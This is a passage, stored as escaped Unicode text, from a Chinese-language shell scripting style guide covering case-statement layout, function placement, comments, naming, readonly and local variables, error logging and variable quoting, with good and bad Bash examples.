\u5e94\u8be5\u5355\u72ec\u4e00\u884c\u3002\\n\u7ed3\u675f\u8bed\u53e5\u5e94\u8be5\u5355\u72ec\u4e00\u884c\u4e14\u8ddf\u5f00\u59cb\u8bed\u53e5\u7f29\u8fdb\u5bf9\u9f50\u3002\\n\\n\u6b63\u4f8b\uff1a\\n```\\nfor dir in ${dirs_to_cleanup}; do\\n    if [[ -d \\"${dir}/${BACKUP_SID}\\" ]]; then\\n        log_date \\"Cleaning up old files in ${dir}/${BACKUP_SID}\\"\\n        rm \\"${dir}/${BACKUP_SID}/\\"*\\n        if [[ \\"$?\\" -ne 0 ]]; then\\n            error_message\\n        fi\\n    else\\n        mkdir -p \\"${dir}/${BACKUP_SID}\\"\\n        if [[ \\"$?\\" -ne 0 ]]; then\\n            error_message\\n        fi\\n    fi\\ndone\\n```\\n\u53cd\u4f8b\uff1a\\n```\\nfunction getBatchName()\\n{\\n    batch_name=\\"batch\\"\\n    if [[ \\"$input5\\"x == *$batch_name* ]]\\n    then\\n        batch_name=$input5\\n    else if [[ \\"$input6\\"x == *$batch_name* ]]\\n    then\\n        batch_name=$input6\\n    else if [[ \\"$input7\\"x == *$batch_name* ]]\\n    then\\n        batch_name=$input7\\n        fi\\n        fi\\n    fi\\n}\\n```\\n\\n##### case\u8bed\u53e5\\n\\n\u901a\u8fc74\u4e2a\u7a7a\u683c\u7f29\u8fdb\u53ef\u9009\u9879\u3002\\n\u53ef\u9009\u9879\u4e2d\u7684\u591a\u4e2a\u547d\u4ee4\u5e94\u8be5\u88ab\u62c6\u5206\u6210\u591a\u884c\uff0c\u6a21\u5f0f\u8868\u8fbe\u5f0f\u3001\u64cd\u4f5c\u548c\u7ed3\u675f\u7b26 ```;;``` \u5728\u4e0d\u540c\u7684\u884c\u3002\\n\u5339\u914d\u8868\u8fbe\u5f0f\u6bd4 case \u548c esac \u7f29\u8fdb\u4e00\u7ea7\u3002\u591a\u884c\u64cd\u4f5c\u8981\u518d\u7f29\u8fdb\u4e00\u7ea7\u3002\\n\u6a21\u5f0f\u8868\u8fbe\u5f0f\u524d\u9762\u4e0d\u5e94\u8be5\u51fa\u73b0\u5de6\u62ec\u53f7\u3002\u907f\u514d\u4f7f\u7528 ```;&``` \u548c ```;;&``` \u7b26\u53f7\u3002\\n\u793a\u4f8b\uff1a\\n```\\ncase \\"${expression}\\" in\\n    a)\\n        variable=\\"...\\"\\n        some_command \\"${variable}\\" \\"${other_expr}\\" ...\\n        ;;\\n    absolute)\\n        actions=\\"relative\\"\\n        another_command \\"${actions}\\" \\"${other_expr}\\" ...\\n        ;;\\n    *)\\n        error \\"Unexpected expression \'${expression}\'\\"\\n        ;;\\nesac\\n```\\n\\n\u53ea\u8981\u6574\u4e2a\u8868\u8fbe\u5f0f\u53ef\u8bfb\uff0c\u7b80\u5355\u7684\u5355\u884c\u547d\u4ee4\u53ef\u4ee5\u8ddf\u6a21\u5f0f\u548c ;; \u5199\u5728\u540c\u4e00\u884c\u3002\u5f53\u5355\u884c\u5bb9\u4e0d\u4e0b\u64cd\u4f5c\u65f6\uff0c\u8bf7\u4f7f\u7528\u591a\u884c\u7684\u5199\u6cd5\u3002\\n\u5355\u884c\u793a\u4f8b\uff1a\\n```\\nverbose=\'false\'\\naflag=\'\'\\nbflag=\'\'\\nfiles=\'\'\\nwhile getopts \'abf:v\' flag; do\\n    case \\"${flag}\\" in\\n        a) aflag=\'true\' ;;\\n        b) bflag=\'true\' ;;\\n        f) files=\\"${OPTARG}\\" ;;\\n        v) verbose=\'true\' ;;\\n        *) error \\"Unexpected option ${flag}\\" ;;\\n    esac\\ndone\\n```\\n\\n#### \u51fd\u6570\u4f4d\u7f6e\\n\\n\u5c06\u6587\u4ef6\u4e2d\u6240\u6709\u7684\u51fd\u6570\u7edf\u4e00\u653e\u5728\u5e38\u91cf\u4e0b\u9762\u3002\u4e0d\u8981\u5728\u51fd\u6570\u4e4b\u95f4\u9690\u85cf\u53ef\u6267\u884c\u4ee3\u7801\u3002\\n\\n\u5982\u679c\u4f60\u6709\u51fd\u6570\uff0c\u8bf7\u5c06\u4ed6\u4eec\u7edf\u4e00\u653e\u5728\u6587\u4ef6\u5934\u90e8\u3002\u53ea\u6709includes\uff0c set \u58f0\u660e\u548c\u5e38\u91cf\u8bbe\u7f6e\u53ef\u80fd\u5728\u51fd\u6570\u58f0\u660e\u4e4b\u524d\u5b8c\u6210\u3002\u4e0d\u8981\u5728\u51fd\u6570\u4e4b\u95f4\u9690\u85cf\u53ef\u6267\u884c\u4ee3\u7801\u3002\u5982\u679c\u90a3\u6837\u505a\uff0c\u4f1a\u4f7f\u5f97\u4ee3\u7801\u5728\u8c03\u8bd5\u65f6\u96be\u4ee5\u8ddf\u8e2a\u5e76\u51fa\u73b0\u610f\u60f3\u4e0d\u5230\u7684\u7ed3\u679c\u3002\\n\\n#### \u4e3b\u51fd\u6570main\\n\\n\u5bf9\u4e8e\u5305\u542b\u81f3\u5c11\u4e86\u4e00\u4e2a\u5176\u4ed6\u51fd\u6570\u7684\u8db3\u591f\u957f\u7684\u811a\u672c\uff0c\u5efa\u8bae\u5b9a\u4e49\u4e00\u4e2a\u540d\u4e3a main \u7684\u51fd\u6570\u3002\u5bf9\u4e8e\u529f\u80fd\u7b80\u5355\u7684\u77ed\u811a\u672c\uff0c main\u51fd\u6570\u662f\u6ca1\u6709\u5fc5\u8981\u7684\u3002\\n\\n\u4e3a\u4e86\u65b9\u4fbf\u67e5\u627e\u7a0b\u5e8f\u7684\u5165\u53e3\u4f4d\u7f6e\uff0c\u5c06\u4e3b\u7a0b\u5e8f\u653e\u5165\u4e00\u4e2a\u540d\u4e3a main \u7684\u51fd\u6570\u4e2d\uff0c\u4f5c\u4e3a\u6700\u5e95\u90e8\u7684\u51fd\u6570\u3002\u8fd9\u4f7f\u5176\u548c\u4ee3\u7801\u5e93\u7684\u5176\u4f59\u90e8\u5206\u4fdd\u6301\u4e00\u81f4\u6027\uff0c\u540c\u65f6\u5141\u8bb8\u4f60\u5b9a\u4e49\u66f4\u591a\u53d8\u91cf\u4e3a\u5c40\u90e8\u53d8\u91cf\uff08\u5982\u679c\u4e3b\u4ee3\u7801\u4e0d\u662f\u4e00\u4e2a\u51fd\u6570\u5c31\u4e0d\u652f\u6301\u8fd9\u79cd\u505a\u6cd5\uff09\u3002\\n\u6587\u4ef6\u4e2d\u6700\u540e\u7684\u975e\u6ce8\u91ca\u884c\u5e94\u8be5\u662f\u5bf9 main \u51fd\u6570\u7684\u8c03\u7528\uff1a\\n```\\nmain \\"$@\\"\\n```\\n\\n#### \u6ce8\u91ca  \\n\\n\u4ee3\u7801\u6ce8\u91ca\u7684\u57fa\u672c\u539f\u5219\uff1a\\n- \u6ce8\u91ca\u5e94\u80fd\u4f7f\u4ee3\u7801\u66f4\u52a0\u660e\u786e\\n- \u907f\u514d\u6ce8\u91ca\u90e8\u5206\u7684\u8fc7\u5ea6\u4fee\u9970\\n- \u4fdd\u6301\u6ce8\u91ca\u90e8\u5206\u7b80\u5355\u3001\u660e\u786e\\n- \u5728\u7f16\u7801\u4ee5\u524d\u5c31\u5e94\u5f00\u59cb\u5199\u6ce8\u91ca\\n- \u6ce8\u91ca\u5e94\u8bf4\u660e\u8bbe\u8ba1\u601d\u8def\u800c\u4e0d\u662f\u63cf\u8ff0\u4ee3\u7801\u7684\u884c\u4e3a\\n\\n\u6ce8\u91ca\u4e0e\u5176\u5468\u56f4\u7684\u4ee3\u7801\u5728\u540c\u4e00\u7f29\u8fdb\u7ea7\u522b\uff0c#\u53f7\u4e0e\u6ce8\u91ca\u6587\u672c\u95f4\u9700\u4fdd\u6301\u4e00\u4e2a\u7a7a\u683c\u4ee5\u548c\u6ce8\u91ca\u4ee3\u7801\u8fdb\u884c\u533a\u5206\u3002\\n\\n##### \u6587\u4ef6\u5934\\n\\n\u6bcf\u4e2a\u6587\u4ef6\u7684\u5f00\u5934\u662f\u5176\u6587\u4ef6\u5185\u5bb9\u7684\u63cf\u8ff0\u3002\u9664\u7248\u6743\u58f0\u660e\u5916\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u9876\u5c42\u6ce8\u91ca\uff0c\u5bf9\u5176\u529f\u80fd\u8fdb\u884c\u7b80\u8981\u6982\u8ff0\u3002\\n\\n\u4f8b\u5982\uff1a\\n```\\n#!/bin/bash\\n#\\n# Perform hot backups of databases.\\n```\\n\\n##### \u529f\u80fd\u6ce8\u91ca\\n\\n\u4e3b\u4f53\u811a\u672c\u4e2d\u9664\u7b80\u6d01\u660e\u4e86\u7684\u51fd\u6570\u5916\u90fd\u5fc5\u987b\u5e26\u6709\u6ce8\u91ca\u3002\u5e93\u6587\u4ef6\u4e2d\u6240\u6709\u51fd\u6570\u65e0\u8bba\u5176\u957f\u77ed\u548c\u590d\u6742\u6027\u90fd\u5fc5\u987b\u5e26\u6709\u6ce8\u91ca\u3002\\n\\n\u8fd9\u4f7f\u5f97\u5176\u4ed6\u4eba\u901a\u8fc7\u9605\u8bfb\u6ce8\u91ca\u5373\u53ef\u5b66\u4f1a\u5982\u4f55\u4f7f\u7528\u4f60\u7684\u7a0b\u5e8f\u6216\u5e93\u51fd\u6570\uff0c\u800c\u4e0d\u9700\u8981\u9605\u8bfb\u4ee3\u7801\u3002\\n\\n\u6240\u6709\u7684\u51fd\u6570\u6ce8\u91ca\u5e94\u8be5\u5305\u542b\uff1a\\n- \u51fd\u6570\u7684\u63cf\u8ff0\\n- \u5168\u5c40\u53d8\u91cf\u7684\u4f7f\u7528\u548c\u4fee\u6539\\n- \u4f7f\u7528\u7684\u53c2\u6570\u8bf4\u660e\\n- \u8fd4\u56de\u503c\uff0c\u800c\u4e0d\u662f\u4e0a\u4e00\u6761\u547d\u4ee4\u8fd0\u884c\u540e\u9ed8\u8ba4\u7684\u9000\u51fa\u72b6\u6001\\n\\n\u4f8b\u5982\uff1a\\n```\\n#!/bin/bash\\n#\\n# Perform hot backups of databases.\\n\\nexport PATH=\'/usr/sbin/bin:/usr/bin:/usr/local/bin\'\\n\\n#######################################\\n# Cleanup files from the backup dir\\n# Globals:\\n#   BACKUP_DIR\\n#   BACKUP_SID\\n# Arguments:\\n#   None\\n# Returns:\\n#   None\\n#######################################\\ncleanup() {\\n    ...\\n}\\n```\\n\\n##### \u5b9e\u73b0\u90e8\u5206\u7684\u6ce8\u91ca\\n\\n\u6ce8\u91ca\u4f60\u4ee3\u7801\u4e2d\u542b\u6709\u6280\u5de7\u3001\u4e0d\u660e\u663e\u3001\u6709\u8da3\u7684\u6216\u8005\u91cd\u8981\u7684\u90e8\u5206\u3002\\n\\n\u8fd9\u90e8\u5206\u9075\u5faa\u4ee3\u7801\u6ce8\u91ca\u7684\u57fa\u672c\u539f\u5219\u5373\u53ef\u3002\u4e0d\u8981\u6ce8\u91ca\u6240\u6709\u4ee3\u7801\u3002\u5982\u679c\u6709\u4e00\u4e2a\u590d\u6742\u7684\u4e0d\u6613\u7406\u89e3\u7684\u903b\u8f91\uff0c\u8bf7\u8fdb\u884c\u7b80\u5355\u7684\u6ce8\u91ca\u3002\\n\\n##### TODO\u6ce8\u91ca\\n\\n\u5bf9\u90a3\u4e9b\u4e34\u65f6\u7684, \u77ed\u671f\u7684\u89e3\u51b3\u65b9\u6848, \u6216\u5df2\u7ecf\u591f\u597d\u4f46\u4ecd\u4e0d\u5b8c\u7f8e\u7684\u4ee3\u7801\u4f7f\u7528 TODO \u6ce8\u91ca.\\n\\nTODO \u6ce8\u91ca\u8981\u4f7f\u7528\u5168\u5927\u5199\u7684\u5b57\u7b26\u4e32 TODO, \u5728\u968f\u540e\u7684\u5706\u62ec\u53f7\u91cc\u5199\u4e0a\u4f60\u7684\u540d\u5b57,\u90ae\u4ef6\u5730\u5740, bug ID, \u6216\u5176\u5b83\u8eab\u4efd\u6807\u8bc6\u548c\u4e0e\u8fd9\u4e00 TODO \u76f8\u5173\u7684 issue\u3002\\n\u4e3b\u8981\u76ee\u7684\u662f\u8ba9\u6dfb\u52a0\u6ce8\u91ca\u7684\u4eba (\u4e5f\u662f\u53ef\u4ee5\u8bf7\u6c42\u63d0\u4f9b\u66f4\u591a\u7ec6\u8282\u7684\u4eba) \u53ef\u6839\u636e\u89c4\u8303\u7684TODO \u683c\u5f0f\u8fdb\u884c\u67e5\u627e\u3002\\n\u6dfb\u52a0 TODO \u6ce8\u91ca\u5e76\u4e0d\u610f\u5473\u7740\u4f60\u8981\u81ea\u5df1\u6765\u4fee\u6b63,\u56e0\u6b64\u5f53\u4f60\u52a0\u4e0a\u5e26\u6709\u59d3\u540d\u7684 TODO \u65f6, \u4e00\u822c\u90fd\u662f\u5199\u4e0a\u81ea\u5df1\u7684\u540d\u5b57\u3002\\n\\n\u8fd9\u4e0e**C++ Style Guide**\u4e2d\u7684\u7ea6\u5b9a\u76f8\u4e00\u81f4\u3002\\n\\n\u4f8b\u5982\uff1a\\n```\\n# TODO(mrmonkey): Handle the unlikely edge cases (bug ####)\\n# TODO(--bug=123456): remove the \\"Last visitors\\" feature\\n```\\n\\n## \u547d\u540d  \\n\\n### \u51fd\u6570\u540d\\n\\n\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff0c\u5e76\u7528\u4e0b\u5212\u7ebf\u5206\u9694\u5355\u8bcd\u3002\u4f7f\u7528\u53cc\u5192\u53f7 ```::``` \u5206\u9694\u5305\u540d\u3002\u51fd\u6570\u540d\u4e4b\u540e\u5fc5\u987b\u6709\u5706\u62ec\u53f7\u3002\\n\\n\u5982\u679c\u4f60\u6b63\u5728\u5199\u5355\u4e2a\u51fd\u6570\uff0c\u8bf7\u7528\u5c0f\u5199\u5b57\u6bcd\u6765\u547d\u540d\uff0c\u5e76\u7528\u4e0b\u5212\u7ebf\u5206\u9694\u5355\u8bcd\u3002\u5982\u679c\u4f60\u6b63\u5728\u5199\u4e00\u4e2a\u5305\uff0c\u4f7f\u7528\u53cc\u5192\u53f7 ```::``` \u6765\u5206\u9694\u5305\u540d\u3002\\n\u51fd\u6570\u540d\u548c\u5706\u62ec\u53f7\u4e4b\u95f4\u6ca1\u6709\u7a7a\u683c\uff0c\u5927\u62ec\u53f7\u5fc5\u987b\u548c\u51fd\u6570\u540d\u4f4d\u4e8e\u540c\u4e00\u884c\u3002\\n\u5f53\u51fd\u6570\u540d\u540e\u5b58\u5728 ```()``` \u65f6\uff0c\u5173\u952e\u8bcd function \u662f\u591a\u4f59\u7684\uff0c\u5efa\u8bae\u4e0d\u5e26 function \u7684\u5199\u6cd5\uff0c\u4f46\u81f3\u5c11\u505a\u5230\u540c\u4e00\u9879\u76ee\u5185\u98ce\u683c\u4fdd\u6301\u4e00\u81f4\u3002\\n\u6b63\u4f8b\uff1a\\n```\\n# Single function\\nmy_func() {\\n  ...\\n}\\n\\n# Part of a package\\nmypackage::my_func() {\\n  ...\\n}\\n```\\n\u53cd\u4f8b\uff1a\\n```\\nfunction my_func\\n{\\n    ...\\n}\\n```\\n\\n### \u53d8\u91cf\u540d\\n\\n\u89c4\u5219\u540c\u51fd\u6570\u540d\u4e00\u81f4\u3002\\n\\n\u5faa\u73af\u4e2d\u7684\u53d8\u91cf\u540d\u5e94\u8be5\u548c\u6b63\u5728\u88ab\u5faa\u73af\u7684\u53d8\u91cf\u540d\u4fdd\u6301\u76f8\u4f3c\u7684\u540d\u79f0\u3002\\n\u793a\u4f8b\uff1a\\n```\\nfor zone in ${zones}; do\\n    something_with \\"${zone}\\"\\ndone\\n```\\n### \u5e38\u91cf\u548c\u73af\u5883\u53d8\u91cf\u540d\\n\\n\u5168\u90e8\u5927\u5199\uff0c\u7528\u4e0b\u5212\u7ebf\u5206\u9694\uff0c\u58f0\u660e\u5728\u6587\u4ef6\u7684\u9876\u90e8\u3002\\n\\n\u5e38\u91cf\u548c\u4efb\u4f55\u5bfc\u51fa\u5230\u73af\u5883\u4e2d\u7684\u53d8\u91cf\u90fd\u5e94\u8be5\u5927\u5199\u3002\\n\u793a\u4f8b\uff1a\\n```\\n# Constant\\nreadonly PATH_TO_FILES=\'/some/path\'\\n\\n# Both constant and environment\\ndeclare -xr BACKUP_SID=\'PROD\'\\n```\\n\u6709\u4e9b\u60c5\u51b5\u4e0b\u9996\u6b21\u521d\u59cb\u5316\u53ca\u5e38\u91cf\uff08\u4f8b\u5982\uff0c\u901a\u8fc7getopts\uff09\uff0c\u56e0\u6b64\uff0c\u5728getopts\u4e2d\u6216\u57fa\u4e8e\u6761\u4ef6\u6765\u8bbe\u5b9a\u5e38\u91cf\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u4e4b\u540e\u5e94\u8be5\u7acb\u5373\u8bbe\u7f6e\u5176\u4e3a\u53ea\u8bfb\u3002\\n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728\u51fd\u6570\u4e2d\u4f7f\u7528 declare \u5bf9\u5168\u5c40\u53d8\u91cf\u65e0\u6548\uff0c\u6240\u4ee5\u63a8\u8350\u4f7f\u7528 readonly \u548c export \u6765\u4ee3\u66ff\u3002\\n\u793a\u4f8b\uff1a\\n```\\nVERBOSE=\'false\'\\nwhile getopts \'v\' flag; do\\n  case \\"${flag}\\" in\\n    v) VERBOSE=\'true\' ;;\\n  esac\\ndone\\nreadonly VERBOSE\\n```\\n\\n### \u53ea\u8bfb\u53d8\u91cf\\n\\n\u4f7f\u7528 readonly \u6216\u8005 declare -r \u6765\u786e\u4fdd\u53d8\u91cf\u53ea\u8bfb\u3002\\n\\n\u56e0\u4e3a\u5168\u5c40\u53d8\u91cf\u5728shell\u4e2d\u5e7f\u6cdb\u4f7f\u7528\uff0c\u6240\u4ee5\u5728\u4f7f\u7528\u5b83\u4eec\u7684\u8fc7\u7a0b\u4e2d\u6355\u83b7\u9519\u8bef\u662f\u5f88\u91cd\u8981\u7684\u3002\u5f53\u4f60\u58f0\u660e\u4e86\u4e00\u4e2a\u53d8\u91cf\uff0c\u5e0c\u671b\u5176\u53ea\u8bfb\uff0c\u90a3\u4e48\u8bf7\u660e\u786e\u6307\u51fa\u3002\\n\u793a\u4f8b\uff1a\\n```\\nzip_version=\\"$(dpkg --status zip | grep Version: | cut -d \' \' -f 2)\\"\\nif [[ -z \\"${zip_version}\\" ]]; then\\n  error_message\\nelse\\n  readonly zip_version\\nfi\\n```\\n### \u5c40\u90e8\u53d8\u91cf\\n\\n\u6bcf\u6b21\u53ea\u58f0\u660e\u4e00\u4e2a\u53d8\u91cf,\u4e0d\u8981\u4f7f\u7528\u7ec4\u5408\u58f0\u660e\uff0c\u6bd4\u5982`a=1 b=2`;  \\n\\n\u4f7f\u7528 local \u58f0\u660e\u7279\u5b9a\u529f\u80fd\u7684\u53d8\u91cf\u3002\u58f0\u660e\u548c\u8d4b\u503c\u5e94\u8be5\u5728\u4e0d\u540c\u884c\u3002\\n\\n\u5fc5\u987b\u4f7f\u7528 local \u6765\u58f0\u660e\u5c40\u90e8\u53d8\u91cf\uff0c\u4ee5\u786e\u4fdd\u5176\u53ea\u5728\u51fd\u6570\u5185\u90e8\u548c\u5b50\u51fd\u6570\u4e2d\u53ef\u89c1\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u6c61\u67d3\u5168\u5c40\u540d\u79f0\u7a7a\u95f4\u4ee5\u53ca\u907f\u514d\u65e0\u610f\u4e2d\u8bbe\u7f6e\u53ef\u80fd\u5728\u51fd\u6570\u5916\u90e8\u5177\u6709\u91cd\u8981\u610f\u4e49\u7684\u53d8\u91cf\u3002\\n\\n\u5f53\u4f7f\u7528\u547d\u4ee4\u66ff\u6362\u8fdb\u884c\u8d4b\u503c\u65f6\uff0c\u53d8\u91cf\u58f0\u660e\u548c\u8d4b\u503c\u5fc5\u987b\u5206\u5f00\u3002\u56e0\u4e3a\u5185\u5efa\u7684 local \u4e0d\u4f1a\u4ece\u547d\u4ee4\u66ff\u6362\u4e2d\u4f20\u9012\u9000\u51fa\u7801\u3002\\n\u6b63\u4f8b\uff1a\\n```\\nmy_func2() {\\n    local name=\\"$1\\"\\n    # \u547d\u4ee4\u66ff\u6362\u8d4b\u503c\uff0c\u53d8\u91cf\u58f0\u660e\u548c\u8d4b\u503c\u9700\u653e\u5230\u4e0d\u540c\u884c:\\n    local my_var\\n    my_var=\\"$(my_func)\\" || return\\n    ...\\n}\\n```\\n\u53cd\u4f8b\uff1a\\n```\\nmy_func2() {\\n    # \u7981\u6b62\u4ee5\u4e0b\u5199\u6cd5: $? \u5c06\u83b7\u53d6\u5230\'local\'\u6307\u4ee4\u7684\u8fd4\u56de\u503c, \u800c\u975e my_func\\n    local my_var=\\"$(my_func)\\"\\n    [[ $? -eq 0 ]] || return\\n\\n    ...\\n}\\n```\\n\\n## \u5f02\u5e38\u4e0e\u65e5\u5fd7\\n\\n### \u5f02\u5e38\\n\u4f7f\u7528shell\u8fd4\u56de\u503c\u6765\u8fd4\u56de\u5f02\u5e38\uff0c\u5e76\u6839\u636e\u4e0d\u540c\u7684\u5f02\u5e38\u60c5\u51b5\u8fd4\u56de\u4e0d\u540c\u7684\u503c\u3002\\n\\n### \u65e5\u5fd7\\n\u6240\u6709\u7684\u9519\u8bef\u4fe1\u606f\u90fd\u5e94\u88ab\u5bfc\u5411\u5230STDERR\uff0c\u8fd9\u6837\u5c06\u6709\u5229\u4e8e\u51fa\u73b0\u95ee\u9898\u65f6\u5feb\u901f\u533a\u5206\u6b63\u5e38\u8f93\u51fa\u548c\u5f02\u5e38\u8f93\u51fa\u3002\\n\\n\u5efa\u8bae\u4f7f\u7528\u4e0e\u4ee5\u4e0b\u51fd\u6570\u7c7b\u4f3c\u7684\u65b9\u5f0f\u6765\u6253\u5370\u6b63\u5e38\u548c\u5f02\u5e38\u8f93\u51fa\uff1a\\n```\\nerr() {\\n    echo \\"[$(date +\'%FT%T%z\')]: $@\\" >&2\\n}\\n\\nif ! do_something; then\\n    err \\"Unable to do_something\\"\\n    exit \\"${E_DID_NOTHING}\\"\\nfi\\n```\\n\\n## \u7f16\u7a0b\u5b9e\u8df5<sup>  *\u6301\u7eed\u5206\u7c7b\u5e76\u5b8c\u5584*  </sup>\\n\\n### \u53d8\u91cf\u6269\u5c55 <sup>  *\u63a8\u8350*  </sup>\\n\\n\u901a\u5e38\u60c5\u51b5\u4e0b\u63a8\u8350\u4e3a\u53d8\u91cf\u52a0\u4e0a\u5927\u62ec\u53f7\u5982 ```\\"${var}\\"``` \u800c\u4e0d\u662f ```\\"$var\\"``` \uff0c\u4f46\u5177\u4f53\u4e5f\u8981\u89c6\u60c5\u51b5\u800c\u5b9a\u3002\\n\\n\u4ee5\u4e0b\u6309\u7167\u4f18\u5148\u987a\u5e8f\u5217\u51fa\u5efa\u8bae\uff1a\\n- \u4e0e\u73b0\u6709\u4ee3\u7801\u4fdd\u6301\u4e00\u81f4\\n- \u5355\u5b57\u7b26\u53d8\u91cf\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u624d\u9700\u8981\u88ab\u62ec\u8d77\u6765\\n- \u4f7f\u7528\u5f15\u53f7\u5f15\u7528\u53d8\u91cf\uff0c\u53c2\u8003\u4e0b\u4e00\u8282\uff1a\u53d8\u91cf\u5f15\u7528\\n\\n\u8be6\u7ec6\u793a\u4f8b\u5982\u4e0b\uff1a\\n\u6b63\u4f8b\uff1a\\n```\\n# \u4f4d\u7f6e\u53d8\u91cf\u548c\u7279\u6b8a\u53d8\u91cf\uff0c\u53ef\u4ee5\u4e0d\u7528\u5927\u62ec\u53f7:\\necho \\"Positional: $1\\" \\"$5\\" \\"$3\\"\\necho \\"Specials: !=$!, -=$-, _=$_. ?=$?, #=$# *=$* @=$@ \\\\$=$$ ...\\"\\n\\n# \u5f53\u4f4d\u7f6e\u53d8\u91cf\u5927\u4e8e\u7b49\u4e8e10\uff0c\u5219\u5fc5\u987b\u6709\u5927\u62ec\u53f7:\\necho \\"many parameters: ${10}\\"\\n\\n# \u5f53\u51fa\u73b0\u6b67\u4e49\u65f6\uff0c\u5fc5\u987b\u6709\u5927\u62ec\u53f7:\\n# Output is \\"a0b0c0\\"\\nset -- a b c\\necho \\"${1}0${2}0${3}0\\"\\n\\n# \u4f7f\u7528\u53d8\u91cf\u6269\u5c55\u8d4b\u503c\u65f6\uff0c\u5fc5\u987b\u6709\u5927\u62ec\u53f7\uff1a\\nDEFAULT_MEM=${DEFUALT_MEM:-\\"-Xms2g -Xmx2g -XX:MaxDirectMemorySize=4g\\"}\\n\\n# \u5176\u4ed6\u5e38\u89c4\u53d8\u91cf\u7684\u63a8\u8350\u5904\u7406\u65b9\u5f0f:\\necho \\"PATH=${PATH}, PWD=${PWD}, mine=${some_var}\\"\\nwhile read f; do\\n    echo \\"file=${f}\\"\\ndone < <(ls -l /tmp)\\n```\\n\\n\u53cd\u4f8b\uff1a\\n```\\n# \u65e0\u5f15\u53f7, \u65e0\u5927\u62ec\u53f7, \u7279\u6b8a\u53d8\u91cf\uff0c\u5355\u5b57\u7b26\u53d8\u91cf\\necho a=$avar \\"b=$bvar\\" \\"PID=${$}\\" \\"${1}\\"\\n\\n# \u65e0\u5927\u62ec\u53f7\u4ea7\u751f\u6b67\u4e49\u573a\u666f\uff1a\u4ee5\u4e0b\u4f1a\u88ab\u89e3\u6790\u4e3a \\"${1}0${2}0${3}0\\",\\n# \u800c\u975e \\"${10}${20}${30}\\nset -- a b c\\necho \\"$10$20$30\\"\\n```\\n\\n#### \u53d8\u91cf\u5f15\u7528 <sup>  *\u63a8\u8350*  </sup>\\n\u53d8\u91cf\u5f15\u7528\u901a\u5e38\u60c5\u51b5\u4e0b\u5e94\u9075\u5faa\u4ee5\u4e0b\u539f\u5219\uff1a\\n- \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u63a8\u8350\u4f7f\u7528\u5f15\u53f7\u5f15\u7528\u5305\u542b\u53d8\u91cf\u3001\u547d\u4ee4\u66ff\u6362\u7b26\u3001\u7a7a\u683c\u6216shell\u5143\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\\n- \u5728\u6709\u660e\u786e\u8981\u6c42\u5fc5\u987b\u4f7f\u7528\u65e0\u5f15\u53f7\u6269\u5c55\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4e0d\u7528\u5f15\u53f7\\n- \u5b57\u7b26\u4e32\u4e3a\u5355\u8bcd\u7c7b\u578b\u65f6\u624d\u63a8\u8350\u7528\u5f15\u53f7\uff0c\u800c\u975e\u547d\u4ee4\u9009\u9879\u6216\u8005\u8def\u5f84\u540d\\n- \u4e0d\u8981\u5bf9\u6574\u6570\u4f7f\u7528\u5f15\u53f7\\n- \u7279\u522b\u6ce8\u610f ```[[``` \u4e2d\u6a21\u5f0f\u5339\u914d\u7684\u5f15\u53f7\u89c4\u5219\\n- \u5728\u65e0\u7279\u6b8a\u60c5\u51b5\u4e0b\uff0c\u63a8\u8350\u4f7f\u7528 ```$@``` \u800c\u975e ```$*```\\n\\n\u4ee5\u4e0b\u901a\u8fc7\u793a\u4f8b\u8bf4\u660e\uff1a\\n```\\n# \'\u5355\u5f15\u53f7\' \u8868\u793a\u7981\u7528\u53d8\u91cf\u66ff\u6362\\n# \\"\u53cc\u5f15\u53f7\\" \u8868\u793a\u9700\u8981\u53d8\u91cf\u66ff\u6362\\n\\n# \u793a\u4f8b1\uff1a \u547d\u4ee4\u66ff\u6362\u9700\u4f7f\u7528\u53cc\u5f15\u53f7\\nflag=\\"$(some_command and its args \\"$@\\" \'quoted separately\')\\"\\n\\n# \u793a\u4f8b2\uff1a\u5e38\u89c4\u53d8\u91cf\u9700\u4f7f\u7528\u53cc\u5f15\u53f7\\necho \\"${flag}\\"\\n\\n# \u793a\u4f8b3\uff1a\u6574\u6570\u4e0d\u4f7f\u7528\u5f15\u53f7\\nvalue=32\\n# \u793a\u4f8b4\uff1a\u5373\u4fbf\u547d\u4ee4\u66ff\u6362\u8f93\u51fa\u4e3a\u6574\u6570\uff0c\u4e5f\u9700\u8981\u4f7f\u7528\u5f15\u53f7\\nnumber=\\"$(generate_number)\\"\\n\\n# \u793a\u4f8b5\uff1a\u5355\u8bcd\u53ef\u4ee5\u4f7f\u7528\u5f15\u53f7\uff0c\u4f46\u4e0d\u4f5c\u5f3a\u5236\u8981\u6c42\\nreadonly USE_INTEGER=\'true\'\\n\\n# \u793a\u4f8b6\uff1a\u8f93\u51fa\u7279\u6b8a\u7b26\u53f7\u4f7f\u7528\u5355\u5f15\u53f7\u6216\u8f6c\u4e49\\necho \'Hello stranger, and well met. Earn lots of $$$\'\\necho \\"Process $$: Done making \\\\$\\\\$\\\\$.\\"\\n\\n# \u793a\u4f8b7\uff1a\u547d\u4ee4\u53c2\u6570\u53ca\u8def\u5f84\u4e0d\u9700\u8981\u5f15\u53f7\\ngrep -li Hugo /dev/null \\"$1\\"\\n\\n# \u793a\u4f8b8\uff1a\u5e38\u89c4\u53d8\u91cf\u7528\u53cc\u5f15\u53f7\uff0cccs\u53ef\u80fd\u4e3a\u7a7a\u7684\u7279\u6b8a\u60c5\u51b5\u53ef\u4e0d\u7528\u5f15\u53f7\\ngit send-email --to \\"${reviewers}\\" ${ccs:+\\"--cc\\" \\"${ccs}\\"}\\n\\n# \u793a\u4f8b9\uff1a\u6b63\u5219\u7528\u5355\u5f15\u53f7\uff0c$1\u53ef\u80fd\u4e3a\u7a7a\u7684\u7279\u6b8a\u60c5\u51b5\u53ef\u4e0d\u7528\u5f15\u53f7\\ngrep -cP \'([Ss]pecial|\\\\|?characters*)$\' ${1:+\\"$1\\"}\\n\\n# 